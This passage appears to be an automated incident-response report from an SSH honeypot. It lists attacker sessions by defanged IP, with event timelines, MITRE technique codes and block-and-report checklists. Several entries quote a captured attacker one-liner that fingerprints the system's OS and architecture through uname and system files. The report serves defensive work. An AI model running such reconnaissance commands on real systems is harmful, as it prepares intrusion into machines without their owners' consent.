| **First Seen** | 2026-07-09 18:28 |
| **Last Seen** | 2026-07-09 18:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:28:00` | `cowrie.session.connect` |
| `2026-07-09 18:28:00` | `cowrie.client.version` |
| `2026-07-09 18:28:00` | `cowrie.client.kex` |
| `2026-07-09 18:28:03` | `cowrie.login.success` |
| `2026-07-09 18:28:03` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]145` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d40227d75ad

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 18:28 |
| **Last Seen** | 2026-07-09 18:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:28:37` | `cowrie.session.connect` |
| `2026-07-09 18:28:38` | `cowrie.client.version` |
| `2026-07-09 18:28:38` | `cowrie.client.kex` |
| `2026-07-09 18:28:40` | `cowrie.login.success` |
| `2026-07-09 18:28:41` | `cowrie.session.params` |
| `2026-07-09 18:28:41` | `cowrie.command.input` |
| `2026-07-09 18:28:42` | `cowrie.log.closed` |
| `2026-07-09 18:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66a004ecc1f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:28 |
| **Last Seen** | 2026-07-09 18:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:28:55` | `cowrie.session.connect` |
| `2026-07-09 18:28:55` | `cowrie.client.version` |
| `2026-07-09 18:28:55` | `cowrie.client.kex` |
| `2026-07-09 18:28:55` | `cowrie.login.success` |
| `2026-07-09 18:28:56` | `cowrie.session.params` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.success` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.command.input` |
| `2026-07-09 18:28:56` | `cowrie.log.closed` |
| `2026-07-09 18:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eac338b1a79f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:30 |
| **Last Seen** | 2026-07-09 18:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:30:41` | `cowrie.session.connect` |
| `2026-07-09 18:30:41` | `cowrie.client.version` |
| `2026-07-09 18:30:41` | `cowrie.client.kex` |
| `2026-07-09 18:30:41` | `cowrie.login.success` |
| `2026-07-09 18:30:42` | `cowrie.session.params` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.success` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:42` | `cowrie.command.input` |
| `2026-07-09 18:30:43` | `cowrie.log.closed` |
| `2026-07-09 18:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a394bbd679

| Field | Detail |
|---|---|
| **Source IP** | `122.187.147[.]13` |
| **First Seen** | 2026-07-09 18:32 |
| **Last Seen** | 2026-07-09 18:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:32:21` | `cowrie.session.connect` |
| `2026-07-09 18:32:22` | `cowrie.client.version` |
| `2026-07-09 18:32:22` | `cowrie.client.kex` |
| `2026-07-09 18:32:24` | `cowrie.login.success` |
| `2026-07-09 18:32:25` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.147[.]13` to AbuseIPDB if not already reported
- [ ] Block `122.187.147[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de817aa2d2c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:32 |
| **Last Seen** | 2026-07-09 18:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:32:25` | `cowrie.session.connect` |
| `2026-07-09 18:32:25` | `cowrie.client.version` |
| `2026-07-09 18:32:25` | `cowrie.client.kex` |
| `2026-07-09 18:32:25` | `cowrie.login.success` |
| `2026-07-09 18:32:26` | `cowrie.session.params` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.success` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.command.input` |
| `2026-07-09 18:32:26` | `cowrie.log.closed` |
| `2026-07-09 18:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c99d0346e48

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-07-09 18:32 |
| **Last Seen** | 2026-07-09 18:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:32:37` | `cowrie.session.connect` |
| `2026-07-09 18:32:39` | `cowrie.client.version` |
| `2026-07-09 18:32:39` | `cowrie.client.kex` |
| `2026-07-09 18:32:43` | `cowrie.login.success` |
| `2026-07-09 18:32:44` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e489baddcf

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 18:33 |
| **Last Seen** | 2026-07-09 18:33 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:33:17` | `cowrie.session.connect` |
| `2026-07-09 18:33:19` | `cowrie.client.version` |
| `2026-07-09 18:33:19` | `cowrie.client.kex` |
| `2026-07-09 18:33:26` | `cowrie.login.success` |
| `2026-07-09 18:33:29` | `cowrie.session.params` |
| `2026-07-09 18:33:29` | `cowrie.command.input` |
| `2026-07-09 18:33:31` | `cowrie.log.closed` |
| `2026-07-09 18:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13082162dea9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:34 |
| **Last Seen** | 2026-07-09 18:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:34:03` | `cowrie.session.connect` |
| `2026-07-09 18:34:03` | `cowrie.client.version` |
| `2026-07-09 18:34:03` | `cowrie.client.kex` |
| `2026-07-09 18:34:03` | `cowrie.login.success` |
| `2026-07-09 18:34:04` | `cowrie.session.params` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.success` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.command.input` |
| `2026-07-09 18:34:04` | `cowrie.log.closed` |
| `2026-07-09 18:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ca745f95d5

| Field | Detail |
|---|---|
| **Source IP** | `71.12.241[.]225` |
| **First Seen** | 2026-07-09 18:34 |
| **Last Seen** | 2026-07-09 18:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:34:39` | `cowrie.session.connect` |
| `2026-07-09 18:34:39` | `cowrie.client.version` |
| `2026-07-09 18:34:39` | `cowrie.client.kex` |
| `2026-07-09 18:34:40` | `cowrie.login.success` |
| `2026-07-09 18:34:41` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.12.241[.]225` to AbuseIPDB if not already reported
- [ ] Block `71.12.241[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84040e165e52

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-07-09 18:34 |
| **Last Seen** | 2026-07-09 18:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:34:50` | `cowrie.session.connect` |
| `2026-07-09 18:34:50` | `cowrie.client.version` |
| `2026-07-09 18:34:50` | `cowrie.client.kex` |
| `2026-07-09 18:34:52` | `cowrie.login.success` |
| `2026-07-09 18:34:52` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eecaa0321796

| Field | Detail |
|---|---|
| **Source IP** | `223.100.248[.]64` |
| **First Seen** | 2026-07-09 18:35 |
| **Last Seen** | 2026-07-09 18:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:35:27` | `cowrie.session.connect` |
| `2026-07-09 18:35:28` | `cowrie.client.version` |
| `2026-07-09 18:35:28` | `cowrie.client.kex` |
| `2026-07-09 18:35:32` | `cowrie.login.success` |
| `2026-07-09 18:35:32` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.100.248[.]64` to AbuseIPDB if not already reported
- [ ] Block `223.100.248[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b148b961cfb9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:35 |
| **Last Seen** | 2026-07-09 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:35:33` | `cowrie.session.connect` |
| `2026-07-09 18:35:33` | `cowrie.client.version` |
| `2026-07-09 18:35:33` | `cowrie.client.kex` |
| `2026-07-09 18:35:34` | `cowrie.login.success` |
| `2026-07-09 18:35:35` | `cowrie.session.params` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.success` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.command.input` |
| `2026-07-09 18:35:35` | `cowrie.log.closed` |
| `2026-07-09 18:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f1b43a6b2fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:37 |
| **Last Seen** | 2026-07-09 18:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:37:05` | `cowrie.session.connect` |
| `2026-07-09 18:37:05` | `cowrie.client.version` |
| `2026-07-09 18:37:05` | `cowrie.client.kex` |
| `2026-07-09 18:37:05` | `cowrie.login.success` |
| `2026-07-09 18:37:06` | `cowrie.session.params` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.success` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:06` | `cowrie.command.input` |
| `2026-07-09 18:37:07` | `cowrie.log.closed` |
| `2026-07-09 18:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2937c395ddcb

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 18:37 |
| **Last Seen** | 2026-07-09 18:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:37:13` | `cowrie.session.connect` |
| `2026-07-09 18:37:13` | `cowrie.client.version` |
| `2026-07-09 18:37:13` | `cowrie.client.kex` |
| `2026-07-09 18:37:14` | `cowrie.login.success` |
| `2026-07-09 18:37:17` | `cowrie.session.params` |
| `2026-07-09 18:37:17` | `cowrie.command.input` |
| `2026-07-09 18:37:18` | `cowrie.log.closed` |
| `2026-07-09 18:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9513cb6195

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:38 |
| **Last Seen** | 2026-07-09 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:38:37` | `cowrie.session.connect` |
| `2026-07-09 18:38:37` | `cowrie.client.version` |
| `2026-07-09 18:38:37` | `cowrie.client.kex` |
| `2026-07-09 18:38:37` | `cowrie.login.success` |
| `2026-07-09 18:38:38` | `cowrie.session.params` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.success` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.command.input` |
| `2026-07-09 18:38:38` | `cowrie.log.closed` |
| `2026-07-09 18:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b8bf87c33c

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]128` |
| **First Seen** | 2026-07-09 18:38 |
| **Last Seen** | 2026-07-09 18:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:38:52` | `cowrie.session.connect` |
| `2026-07-09 18:38:52` | `cowrie.client.version` |
| `2026-07-09 18:38:52` | `cowrie.client.kex` |
| `2026-07-09 18:38:54` | `cowrie.login.success` |
| `2026-07-09 18:38:55` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c48f13aa33

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]53` |
| **First Seen** | 2026-07-09 18:39 |
| **Last Seen** | 2026-07-09 18:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:39:01` | `cowrie.session.connect` |
| `2026-07-09 18:39:02` | `cowrie.client.version` |
| `2026-07-09 18:39:02` | `cowrie.client.kex` |
| `2026-07-09 18:39:04` | `cowrie.login.success` |
| `2026-07-09 18:39:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]53` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
